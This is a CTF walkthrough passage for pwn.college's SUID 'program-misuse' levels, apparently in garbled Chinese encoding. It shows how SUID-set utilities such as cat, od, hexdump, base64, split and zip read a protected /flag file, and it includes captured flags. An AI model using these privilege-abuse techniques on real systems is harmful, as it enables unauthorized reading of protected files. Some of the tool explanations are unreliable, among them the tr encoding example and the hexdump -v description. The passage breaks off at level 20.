<p>ÈÄöÂ∏∏ÊÉÖÂÜµ‰∏ãÔºåÊôÆÈÄöÁî®Êà∑Âè™ËÉΩ‰ª•Ëá™Â∑±ÁöÑÊùÉÈôêÊâßË°åÁ®ãÂ∫è„ÄÇ‰ΩÜÊòØÔºåÂΩì‰∏Ä‰∏™Á®ãÂ∫èÊã•Êúâ SUID ÊùÉÈôêÊó∂ÔºåÂç≥‰ΩøÊòØÊôÆÈÄöÁî®Êà∑ÊâßË°åËØ•Á®ãÂ∫èÔºåÂÆÉ‰πü‰ºö‰ª•Êñá‰ª∂ÊâÄÊúâËÄÖÁöÑÊùÉÈôêÊù•ÊâßË°å„ÄÇËøôÂú®Êüê‰∫õÊÉÖÂÜµ‰∏ãÈùûÂ∏∏ÊúâÁî®ÔºåÊØîÂ¶ÇËÆ©ÊôÆÈÄöÁî®Êà∑ÊâßË°åÊüê‰∫õÈúÄË¶ÅÁâπÊùÉÊùÉÈôêÁöÑ‰ªªÂä°ÔºåËÄå‰∏çÈúÄË¶ÅÊö¥Èú≤Á≥ªÁªüÁÆ°ÁêÜÂëòÂØÜÁ†Å„ÄÇ</p>
<p>ÁÑ∂ËÄåÔºåSUID ‰πüÂèØËÉΩÂ≠òÂú®ÂÆâÂÖ®È£éÈô©ÔºåÂõ†‰∏∫ÂÆÉÂèØ‰ª•Ë¢´Êª•Áî®‰∏∫ÊèêÂçáÊùÉÈôêÊîªÂáªÁöÑ‰∏ÄÁßçÊâãÊÆµ„ÄÇÂõ†Ê≠§ÔºåÂøÖÈ°ªÂ∞èÂøÉÂú∞ÁÆ°ÁêÜ SUID ÊùÉÈôêÔºåÂπ∂Á°Æ‰øùÂè™ÊúâÂøÖË¶ÅÁöÑÁ®ãÂ∫èÊã•ÊúâÂÆÉ„ÄÇ</p>
<p>Ê≠§‰∏ìÈ¢ò‰∏∫SUIDÂÆâÂÖ®Ê®°Âùó</p>
<h3 id="level1cat"><a class="markdownIt-Anchor" href="#level1cat"></a> level1(cat)</h3>
<p><code>cat /flag</code></p>
<h3 id="level2more"><a class="markdownIt-Anchor" href="#level2more"></a> level2(more)</h3>
<p><code>more /flag</code></p>
<h3 id="level3less"><a class="markdownIt-Anchor" href="#level3less"></a> level3(less)</h3>
<p><code>less /flag</code></p>
<h3 id="level4tail"><a class="markdownIt-Anchor" href="#level4tail"></a> level4(tail)</h3>
<p><code>tail /flag</code></p>
<h3 id="level5head"><a class="markdownIt-Anchor" href="#level5head"></a> level5(head)</h3>
<p><code>head /flag</code></p>
<h3 id="level6sort"><a class="markdownIt-Anchor" href="#level6sort"></a> level6(sort)</h3>
<p><code>sort /flag</code></p>
<h3 id="level7vim"><a class="markdownIt-Anchor" href="#level7vim"></a> level7(vim)</h3>
<p><code>vim /flag</code></p>
<p><code>:q!</code></p>
<h3 id="level8emacs"><a class="markdownIt-Anchor" href="#level8emacs"></a> level8(emacs)</h3>
<p><code>emacs /flag</code></p>
<h3 id="level9nano"><a class="markdownIt-Anchor" href="#level9nano"></a> level9(nano)</h3>
<p><code>nano /flag</code></p>
<h3 id="level10rev"><a class="markdownIt-Anchor" href="#level10rev"></a> level10(rev)</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level10:/challenge$ <span class="token function">rev</span> /flag
<span class="token punctuation">&#125;</span>WzU0NzczLDE1Ml0.moqZisxxzyckvEaw_thAOt6crp8<span class="token punctuation">&#123;</span>egelloc.nwp
hacker@program-misuse~level10:/challenge$ <span class="token function">rev</span>
<span class="token punctuation">&#125;</span>WzU0NzczLDE1Ml0.moqZisxxzyckvEaw_thAOt6crp8<span class="token punctuation">&#123;</span>egelloc.nwp
pwn.college<span class="token punctuation">&#123;</span>8prc6tOAht_waEvkcyzxxsiZqom.0lM1EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level11od"><a class="markdownIt-Anchor" href="#level11od"></a> level11(od)</h3>
<p>Â≠¶‰ºöÁî®<code>man</code> ‰∏ç‰ºöÁöÑÂ∑•ÂÖ∑Â∞± <code>man od</code></p>
<p>Âú®ËÆ°ÁÆóÊú∫È¢ÜÂüüÔºå‚Äúod‚Äù ÊòØ‰∏Ä‰∏™Â∏∏Áî®ÁöÑÊåá‰ª§ÔºåÈÄöÂ∏∏Áî®‰∫éÊòæÁ§∫Êñá‰ª∂ÁöÑÂÖ´ËøõÂà∂ÂÜÖÂÆπ„ÄÇ‰ª•‰∏ãÊòØ‰∏Ä‰∫õÂ∏∏ËßÅÁöÑ ‚Äúod‚Äù Êåá‰ª§ÈÄâÈ°πÔºö</p>
<ol>
<li><code>-a</code>Ôºö‰ª•ÂèØÊâìÂç∞Â≠óÁ¨¶ÁöÑÂΩ¢ÂºèÊòæÁ§∫Êñá‰ª∂ÂÜÖÂÆπ„ÄÇ</li>
<li><code>-b</code>Ôºö‰ª•ÂÖ´ËøõÂà∂ÂΩ¢ÂºèÊòæÁ§∫Êñá‰ª∂ÂÜÖÂÆπ„ÄÇ</li>
<li><code>-c</code>Ôºö‰ª•Â≠óÁ¨¶ÂΩ¢ÂºèÊòæÁ§∫Êñá‰ª∂ÂÜÖÂÆπ„ÄÇ</li>
<li><code>-d</code>Ôºö‰ª•ÂçÅËøõÂà∂ÂΩ¢ÂºèÊòæÁ§∫Êñá‰ª∂ÂÜÖÂÆπ„ÄÇ</li>
<li><code>-h</code>Ôºö‰ª•ÂçÅÂÖ≠ËøõÂà∂ÂΩ¢ÂºèÊòæÁ§∫Êñá‰ª∂ÂÜÖÂÆπ„ÄÇ</li>
<li><code>-t [format]</code>ÔºöÊåáÂÆöËæìÂá∫Ê†ºÂºèÔºåÂ¶Ç <code>-t x1</code> ÂèØ‰ª•Â∞ÜËæìÂá∫Ê†ºÂºèÊåáÂÆö‰∏∫ÊØè‰∏™Â≠óËäÇ‰ª•ÂçÅÂÖ≠ËøõÂà∂ÊòæÁ§∫„ÄÇ</li>
<li><code>-A</code> ÊòæÁ§∫Âú∞ÂùÄ</li>
</ol>
<p><code>tr</code> ÂëΩ‰ª§Áî®‰∫éÂ≠óÁ¨¶ÊõøÊç¢ÊàñÂà†Èô§„ÄÇ‰ª•‰∏ãÊòØ‰∏Ä‰∫õÂ∏∏ËßÅÁöÑ <code>tr</code> ÂëΩ‰ª§Áî®Ê≥ïÔºö</p>
<ol>
<li><strong>ÊõøÊç¢Â≠óÁ¨¶</strong>Ôºö‰ΩøÁî® <code>-s</code> ÈÄâÈ°πÊù•ÊåáÂÆöË¶ÅÊõøÊç¢ÁöÑÂ≠óÁ¨¶ÈõÜÂêà„ÄÇ‰æãÂ¶ÇÔºåÂ∞ÜÊñá‰ª∂‰∏≠ÁöÑÊâÄÊúâÂ∞èÂÜôÂ≠óÊØçÊõøÊç¢‰∏∫Â§ßÂÜôÂ≠óÊØçÔºö</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tr</span> <span class="token string">'a-z'</span> <span class="token string">'A-Z'</span> <span class="token operator">&lt;</span> input.txt <span class="token operator">></span> output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol>
<li><strong>Âà†Èô§Â≠óÁ¨¶</strong>Ôºö‰ΩøÁî® <code>-d</code> ÈÄâÈ°πÊù•Âà†Èô§ÊåáÂÆöÁöÑÂ≠óÁ¨¶„ÄÇ‰æãÂ¶ÇÔºåÂà†Èô§Êñá‰ª∂‰∏≠ÁöÑÊâÄÊúâÊï∞Â≠óÔºö</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">'0-9'</span> <span class="token operator">&lt;</span> input.txt <span class="token operator">></span> output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol>
<li><strong>ËΩ¨Êç¢Â≠óÁ¨¶</strong>Ôºö‰ΩøÁî® <code>-c</code> ÈÄâÈ°πÊù•ÂØπÂ≠óÁ¨¶ËøõË°åËΩ¨Êç¢„ÄÇ‰æãÂ¶ÇÔºåÂ∞ÜÊñá‰ª∂‰∏≠ÁöÑÊâÄÊúâÂ∞èÂÜôÂ≠óÊØçËΩ¨Êç¢‰∏∫Â§ßÂÜôÂ≠óÊØçÔºåÂêåÊó∂Âà†Èô§ÂÖ∂‰ªñÂ≠óÁ¨¶Ôºö</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tr</span> <span class="token parameter variable">-cd</span> <span class="token string">'a-zA-Z'</span> <span class="token operator">&lt;</span> input.txt <span class="token operator">></span> output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol>
<li><strong>ÂéãÁº©Â≠óÁ¨¶</strong>Ôºö‰ΩøÁî® <code>-s</code> ÈÄâÈ°πÊù•ÂéãÁº©Â≠óÁ¨¶„ÄÇ‰æãÂ¶ÇÔºåÂ∞ÜÊñá‰ª∂‰∏≠ËøûÁª≠ÈáçÂ§çÁöÑÁ©∫Ê†ºÊõøÊç¢‰∏∫Âçï‰∏™Á©∫Ê†ºÔºö</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">tr -s &#39; &#39; &lt; input.txt &gt; output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol>
<li><strong>ËΩ¨Êç¢Â≠óÁ¨¶ÁºñÁ†Å</strong>ÔºöÂèØ‰ª•‰ΩøÁî® <code>tr</code> ÂëΩ‰ª§Â∞Ü‰∏Ä‰∏™Â≠óÁ¨¶ÈõÜÊò†Â∞Ñ‰∏∫Âè¶‰∏Ä‰∏™Â≠óÁ¨¶ÈõÜ„ÄÇ‰æãÂ¶ÇÔºåÂ∞Ü ISO-8859-1 ÁºñÁ†ÅÁöÑÊñáÊú¨ËΩ¨Êç¢‰∏∫ UTF-8 ÁºñÁ†ÅÔºö</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tr</span> <span class="token string">'ISO-8859-1'</span> <span class="token string">'UTF-8'</span> <span class="token operator">&lt;</span> input.txt <span class="token operator">></span> output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level11:/challenge$ od <span class="token parameter variable">-An</span> <span class="token parameter variable">-a</span> /flag <span class="token operator">|</span><span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">" <span class="token entity" title="\n">\n</span>"</span>
pwn.college<span class="token punctuation">&#123;</span>EjkuFmjnR3PYcvBLt1eB2aHqJG_.01M1EDLzczN0UzW<span class="token punctuation">&#125;</span>nl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="level12hexdump"><a class="markdownIt-Anchor" href="#level12hexdump"></a> level12(hexdump)</h3>
<p><code>hexdump -v -e '/1 &quot;%_p&quot;' /flag</code></p>
<p>Ëøô‰∏™ÂëΩ‰ª§‰∏≠ÁöÑÂèÇÊï∞Ëß£ÈáäÂ¶Ç‰∏ãÔºö</p>
<ul>
<li><code>-v</code>ÔºöÊåáÂÆöÈùôÈªòÊ®°Âºè„ÄÇËøôÂ∞ÜÁ¶ÅÊ≠¢ hexdump Âú®ËæìÂá∫‰∏≠ÊòæÁ§∫ÈáçÂ§çÁöÑË°å„ÄÇ</li>
<li><code>-e</code>ÔºöÊåáÂÆöÊ†ºÂºèÂåñËæìÂá∫ÁöÑÊ®°Êùø„ÄÇÂú®Ëøô‰∏™Ê®°Êùø‰∏≠Ôºå<code>/1</code> Ë°®Á§∫ÊåâÂ≠óËäÇÂ§ÑÁêÜÊñá‰ª∂Ôºå<code>&quot;%_p&quot;</code> ÂàôË°®Á§∫ÊâìÂç∞ÂèØÊâìÂç∞Â≠óÁ¨¶„ÄÇ</li>
</ul>
<p>‰ª•‰∏ãÊòØ‰∏Ä‰∫õÂ∏∏Áî®ÁöÑ <code>hexdump</code> Êåá‰ª§ÈÄâÈ°πÔºö</p>
<ol>
<li>
<p><code>-C</code>Ôºö‰ª•ÂçÅÂÖ≠ËøõÂà∂ÂíåASCIIÂ≠óÁ¨¶ÁöÑÂΩ¢ÂºèÊòæÁ§∫Êñá‰ª∂ÂÜÖÂÆπÔºåÊØè‰∏™Â≠óËäÇÂØπÂ∫î‰∏Ä‰∏™ÂçÅÂÖ≠ËøõÂà∂Êï∞Â≠óÂíå‰∏Ä‰∏™ASCIIÂ≠óÁ¨¶„ÄÇ</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexdump <span class="token parameter variable">-C</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><code>-c</code>Ôºö‰ª•Â≠óÁ¨¶ÂΩ¢ÂºèÊòæÁ§∫Êñá‰ª∂ÂÜÖÂÆπÔºåÂêåÊó∂ÊòæÁ§∫ÊØè‰∏™Â≠óÁ¨¶ÁöÑÂÖ´ËøõÂà∂ÂÄº„ÄÇ</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexdump <span class="token parameter variable">-c</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><code>-n</code>ÔºöÈôêÂà∂ÊòæÁ§∫ÁöÑÂ≠óËäÇÊï∞„ÄÇ</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexdump <span class="token parameter variable">-n</span> <span class="token number">100</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><code>-s</code>Ôºö‰ªéÊåáÂÆöÁöÑÂÅèÁßªÈáèÂºÄÂßãÊòæÁ§∫Êñá‰ª∂ÂÜÖÂÆπ„ÄÇ</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexdump <span class="token parameter variable">-s</span> <span class="token number">100</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><code>-v</code>ÔºöÂÖ≥Èó≠ÈªòËÆ§ÁöÑËæìÂá∫Ê†ºÂºèÔºå‰ª•ÂéüÂßãÁöÑÂçÅÂÖ≠ËøõÂà∂ÊàñÂÖ´ËøõÂà∂Ê†ºÂºèÊòæÁ§∫Êï∞ÊçÆ„ÄÇ</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexdump <span class="token parameter variable">-v</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<p>Ëøô‰∫õÊòØÂ∏∏Áî®ÁöÑ <code>hexdump</code> Êåá‰ª§ÈÄâÈ°πÔºåÂèØ‰ª•Ê†πÊçÆÂÖ∑‰ΩìÁöÑÈúÄÊ±ÇÈÄâÊã©ÂêàÈÄÇÁöÑÈÄâÈ°πÊù•Êü•ÁúãÊñá‰ª∂ÁöÑÂÜÖÂÆπ„ÄÇ</p>
<h3 id="level13xxd"><a class="markdownIt-Anchor" href="#level13xxd"></a> level13(xxd)</h3>
<p><code>xxd /flag</code></p>
<h3 id="level14base32"><a class="markdownIt-Anchor" href="#level14base32"></a> level14(base32)</h3>
<p><code>base32 /flag |base32 -d</code></p>
<h3 id="level15base64"><a class="markdownIt-Anchor" href="#level15base64"></a> level15(base64)</h3>
<p><code>base64 /flag |base64 -d</code></p>
<h3 id="level16split"><a class="markdownIt-Anchor" href="#level16split"></a> level16(split)</h3>
<blockquote>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">split</span> <span class="token punctuation">[</span>-b byte<span class="token punctuation">]</span><span class="token punctuation">[</span>-C <span class="token punctuation">]</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token punctuation">[</span>-l rowcount<span class="token punctuation">]</span><span class="token punctuation">[</span>the <span class="token function">file</span> to split<span class="token punctuation">]</span><span class="token punctuation">[</span>the prefix of the output_file<span class="token punctuation">]</span><span class="token punctuation">[</span>-a suffix_len<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</blockquote>
<p><code>split</code> ÂëΩ‰ª§Áî®‰∫éÂ∞ÜÊñá‰ª∂ÊãÜÂàÜÊàêÂ§ö‰∏™Êõ¥Â∞èÁöÑÊñá‰ª∂„ÄÇÂÆÉÊòØ‰∏Ä‰∏™Âú® Unix ÂíåÁ±ª Unix Á≥ªÁªü‰∏≠Â∏∏ËßÅÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑„ÄÇ<code>split</code> ÂëΩ‰ª§ÈÄöÂ∏∏Áî®‰∫éÈúÄË¶ÅÂ∞ÜÂ§ßÊñá‰ª∂ÂàÜÂâ≤ÊàêÂ§ö‰∏™ËæÉÂ∞èÊñá‰ª∂‰ª•‰æøËøõË°å‰º†Ëæì„ÄÅÂ§á‰ªΩÊàñÂ§ÑÁêÜÁöÑÊÉÖÂÜµ„ÄÇ</p>
<p>‰ª•‰∏ãÊòØ <code>split</code> ÂëΩ‰ª§ÁöÑ‰∏ÄËà¨Ê†ºÂºèÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">split [OPTION]... [INPUT [PREFIX]]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ÂÖ∂‰∏≠Ôºö</p>
<ul>
<li><code>OPTION</code>ÔºöÊòØ‰∏Ä‰∫õÈÄâÈ°πÔºåÂèØ‰ª•Áî®Êù•ÊéßÂà∂ÊãÜÂàÜÁöÑË°å‰∏∫„ÄÇ</li>
<li><code>INPUT</code>ÔºöÊòØË¶ÅÊãÜÂàÜÁöÑËæìÂÖ•Êñá‰ª∂ÁöÑÂêçÁß∞„ÄÇ</li>
<li><code>PREFIX</code>ÔºöÊòØËæìÂá∫Êñá‰ª∂ÁöÑÂâçÁºÄ„ÄÇËæìÂá∫Êñá‰ª∂ÁöÑÂêçÁß∞Â∞Ü‰ª•Ê≠§ÂâçÁºÄÂºÄÂßãÔºåÂêéÈù¢Ë∑üÁùÄ‰∏Ä‰∏™Â≠óÊØçÂ∫èÂè∑‰ª•Âå∫ÂàÜ‰∏çÂêåÁöÑËæìÂá∫Êñá‰ª∂„ÄÇ</li>
</ul>
<p>Â∏∏Áî®ÁöÑÈÄâÈ°πÂåÖÊã¨Ôºö</p>
<ul>
<li><code>-b, --bytes=SIZE</code>ÔºöÊåâÂ§ßÂ∞èÊãÜÂàÜÊñá‰ª∂„ÄÇSIZE ÂèØ‰ª•ÊòØ‰ª• <code>k</code>„ÄÅ<code>M</code>„ÄÅ<code>G</code> Á≠â‰∏∫Âçï‰ΩçÁöÑÊñá‰ª∂Â§ßÂ∞è„ÄÇ</li>
<li><code>-l, --lines=NUMBER</code>ÔºöÊåâË°åÊï∞ÊãÜÂàÜÊñá‰ª∂„ÄÇ</li>
<li><code>-d</code>Ôºö‰ΩøÁî®Êï∞Â≠óÂêéÁºÄËÄå‰∏çÊòØÂ≠óÊØçÂêéÁºÄ„ÄÇ</li>
<li><code>-a, --suffix-length=N</code>ÔºöÊåáÂÆöÁîüÊàêÁöÑÊñá‰ª∂ÂêçÂêéÁºÄÈïøÂ∫¶„ÄÇ</li>
<li><code>-n, --number=CHUNKS</code>ÔºöÊåáÂÆöË¶ÅÁîüÊàêÁöÑÊñá‰ª∂Êï∞Èáè„ÄÇ</li>
</ul>
<p>‰ª•‰∏ãÊòØ‰∏Ä‰∏™Á§∫‰æãÔºåÂ∞Ü‰∏Ä‰∏™Êñá‰ª∂ÊãÜÂàÜÊàêÊØè‰∏™Êñá‰ª∂Â§ßÂ∞è‰∏∫1MBÁöÑÂ§ö‰∏™Êñá‰ª∂Ôºö</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">split</span> <span class="token parameter variable">-b</span> 1M largefile.txt splitfile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰∏™ÂëΩ‰ª§‰ºöÂ∞ÜÂêç‰∏∫ <code>largefile.txt</code> ÁöÑÊñá‰ª∂ÊãÜÂàÜÊàêÂ§ö‰∏™Â§ßÂ∞è‰∏∫1MBÁöÑÊñá‰ª∂ÔºåÂπ∂‰ª• <code>splitfile</code> ‰Ωú‰∏∫ÂâçÁºÄÂëΩÂêç„ÄÇÁîüÊàêÁöÑÊñá‰ª∂ÂêçÂ∞Ü‰ª• <code>splitfile</code> ÂºÄÂ§¥ÔºåÂêéË∑ü‰∏Ä‰∏™Â≠óÊØçÂ∫èÂè∑‰ª•Âå∫ÂàÜ‰∏çÂêåÁöÑÊñá‰ª∂„ÄÇ</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level16:/challenge$ <span class="token function">split</span> /flag
hacker@program-misuse~level16:/challenge$ <span class="token function">ls</span>
babysuid_level16  xaa
hacker@program-misuse~level16:/challenge$ <span class="token function">cat</span> xaa
pwn.college<span class="token punctuation">&#123;</span>4EJPD2ROB2wmP5Nv6kDsY6sawPM.0FO1EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level17-gzip"><a class="markdownIt-Anchor" href="#level17-gzip"></a> level17 (gzip)</h3>
<p><code>zcat</code> ÂëΩ‰ª§ÊòØ‰∏Ä‰∏™Áî®‰∫éÊü•ÁúãÂéãÁº©Êñá‰ª∂ÂÜÖÂÆπÁöÑÂëΩ‰ª§„ÄÇÂÆÉ‰∏é <code>cat</code> ÂëΩ‰ª§Á±ª‰ººÔºå‰ΩÜÊòØÂèØ‰ª•Áõ¥Êé•Êü•ÁúãÁªèËøáÂéãÁº©ÁöÑÊñá‰ª∂ÔºåËÄå‰∏çÈúÄË¶ÅÂÖàËß£ÂéãÁº©„ÄÇ<code>zcat</code> ÂÆûÈôÖ‰∏äÊòØ <code>gzip -d -c</code> ÂëΩ‰ª§ÁöÑÁÆÄÂÜôÔºåÂÆÉ‰ºöËß£ÂéãÁº©Êñá‰ª∂Âπ∂Â∞ÜËß£ÂéãÂêéÁöÑÂÜÖÂÆπËæìÂá∫Âà∞Ê†áÂáÜËæìÂá∫„ÄÇ</p>
<ul>
<li>-c Ë°®Á§∫ËæìÂá∫Âà∞Ê†áÂáÜËæìÂá∫</li>
<li>-d Ëß£ÂéãÁº©</li>
</ul>
<p>‰ΩøÁî® <code>zcat</code> ÂëΩ‰ª§ÁöÑÊ†ºÂºèÂ¶Ç‰∏ãÔºö</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zcat filename.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰∏™ÂëΩ‰ª§‰ºöÂ∞ÜÂêç‰∏∫ <code>filename.gz</code> ÁöÑÂéãÁº©Êñá‰ª∂Ëß£ÂéãÁº©ÔºåÂπ∂Â∞ÜËß£ÂéãÂêéÁöÑÂÜÖÂÆπÁõ¥Êé•ËæìÂá∫Âà∞Ê†áÂáÜËæìÂá∫„ÄÇ‰Ω†ÂèØ‰ª•ÈÄöËøáÁÆ°ÈÅìÂ∞ÜÂÖ∂‰∏éÂÖ∂‰ªñÂëΩ‰ª§‰∏ÄËµ∑‰ΩøÁî®ÔºåÊàñËÄÖÈáçÂÆöÂêëÂà∞Êñá‰ª∂‰∏≠‰øùÂ≠ò„ÄÇ</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level17:/$ zcat flag.gz 
pwn.college<span class="token punctuation">&#123;</span>UePLx3QWU4tdu3DffqC263k2xH.0VO1EDLzczN0Uz<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="level18bzip2"><a class="markdownIt-Anchor" href="#level18bzip2"></a> level18(bzip2)</h3>
<p>‰∏élevel17Á±ª‰ºº</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level18:/$ <span class="token function">bzip2</span> <span class="token parameter variable">-d</span> <span class="token parameter variable">-c</span> flag.bz2 
pwn.college<span class="token punctuation">&#123;</span>kLWPJ4DFr1DV_MV9WKvshGFFn5U.0FM2EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="level19zip"><a class="markdownIt-Anchor" href="#level19zip"></a> level19(zip)</h3>
<p>‰ª•‰∏ãÊòØ‰∏Ä‰∫õÂ∏∏Áî®ÁöÑ <code>zip</code> ÂëΩ‰ª§ÈÄâÈ°πÂíåÁ§∫‰æãÔºö</p>
<ol>
<li><strong>ÂéãÁº©Êñá‰ª∂</strong>Ôºö</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">zip</span> archive.zip file1.txt file2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰∏™ÂëΩ‰ª§‰ºöÂ∞Ü <code>file1.txt</code> Âíå <code>file2.txt</code> ‰∏§‰∏™Êñá‰ª∂ÂéãÁº©Êàê‰∏Ä‰∏™Âêç‰∏∫ <code>archive.zip</code> ÁöÑÂéãÁº©Êñá‰ª∂„ÄÇ</p>
<ol start="2">
<li><strong>ÂéãÁº©ÁõÆÂΩï</strong>Ôºö</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">zip</span> <span class="token parameter variable">-r</span> archive.zip directory/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰∏™ÂëΩ‰ª§‰ºöÂ∞Ü <code>directory/</code> ÁõÆÂΩïÂèäÂÖ∂‰∏ãÁöÑÊâÄÊúâÊñá‰ª∂ÂíåÂ≠êÁõÆÂΩïÂéãÁº©Êàê‰∏Ä‰∏™Âêç‰∏∫ <code>archive.zip</code> ÁöÑÂéãÁº©Êñá‰ª∂„ÄÇ</p>
<ol start="3">
<li><strong>Ê∑ªÂä†Êñá‰ª∂Âà∞Â∑≤Â≠òÂú®ÁöÑÂéãÁº©Êñá‰ª∂</strong>Ôºö</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">zip</span> archive.zip newfile.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰∏™ÂëΩ‰ª§‰ºöÂ∞Ü <code>newfile.txt</code> Ê∑ªÂä†Âà∞Âêç‰∏∫ <code>archive.zip</code> ÁöÑÂ∑≤Â≠òÂú®ÁöÑÂéãÁº©Êñá‰ª∂‰∏≠„ÄÇ</p>
<ol start="4">
<li><strong>ÂàóÂá∫ÂéãÁº©Êñá‰ª∂‰∏≠ÁöÑÂÜÖÂÆπ</strong>Ôºö</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">unzip</span> <span class="token parameter variable">-l</span> archive.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰∏™ÂëΩ‰ª§‰ºöÂàóÂá∫Âêç‰∏∫ <code>archive.zip</code> ÁöÑÂéãÁº©Êñá‰ª∂‰∏≠ÁöÑÊâÄÊúâÊñá‰ª∂ÂíåÁõÆÂΩï„ÄÇ</p>
<ol start="5">
<li><strong>Ëß£ÂéãÁº©Êñá‰ª∂</strong>Ôºö</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">unzip</span> archive.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰∏™ÂëΩ‰ª§‰ºöÂ∞ÜÂêç‰∏∫ <code>archive.zip</code> ÁöÑÂéãÁº©Êñá‰ª∂Ëß£ÂéãÁº©Âà∞ÂΩìÂâçÁõÆÂΩï„ÄÇ</p>
<ol start="6">
<li><strong>Ëß£ÂéãÁº©Âà∞ÊåáÂÆöÁõÆÂΩï</strong>Ôºö</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">unzip</span> archive.zip <span class="token parameter variable">-d</span> /path/to/directory/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰∏™ÂëΩ‰ª§‰ºöÂ∞ÜÂêç‰∏∫ <code>archive.zip</code> ÁöÑÂéãÁº©Êñá‰ª∂Ëß£ÂéãÁº©Âà∞ÊåáÂÆöÁöÑÁõÆÂΩï <code>/path/to/directory/</code> ‰∏≠„ÄÇ</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level19:/challenge$ <span class="token function">man</span> <span class="token function">zip</span>
hacker@program-misuse~level19:/challenge$ <span class="token function">zip</span> flag.zip /flag
  adding: flag <span class="token punctuation">(</span>stored <span class="token number">0</span>%<span class="token punctuation">)</span>
hacker@program-misuse~level19:/challenge$ <span class="token function">ls</span>
babysuid_level19  flag.zip
Archive:  flag.zip
caution: filename not matched:  <span class="token parameter variable">-c</span>
hacker@program-misuse~level19:/challenge$ <span class="token function">unzip</span> <span class="token parameter variable">-c</span> flag.zip 
Archive:  flag.zip
 extracting: flag                    
pwn.college<span class="token punctuation">&#123;</span>Ez72p6_sW8GY7XN4ffOXC_GhJmn.0VM2EDLzczN0UzW<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level20tar"><a class="markdownIt-Anchor" href="#level20tar"></a> level20(tar)</h3>
<p>‰ª•‰∏ãÊòØ‰∏Ä‰∫õÂ∏∏Áî®ÁöÑ <code>tar</code> ÂëΩ‰ª§ÈÄâÈ°πÂíåÁ§∫‰æãÔºö</p>
<ol>
